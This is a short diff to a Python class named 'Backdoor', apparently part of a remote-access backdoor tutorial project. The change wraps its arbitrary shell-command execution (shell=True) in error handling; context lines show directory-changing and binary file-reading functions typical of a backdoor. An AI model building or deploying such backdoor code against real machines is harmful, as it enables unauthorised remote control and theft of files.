@@ -17,7 +17,10 @@ class Backdoor:
         return "[+] Changing working directory to " + path
         
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        try:
+            return subprocess.check_output(command, shell=True)
+        except subprocess.CalledProcessError: #catch errors from incorrectly entered commands
+            return "[-] Command error, check syntax and try again"
     
     def read_file(self, path):
         with open(path, "rb") as file: #rb - open file for reading as binary
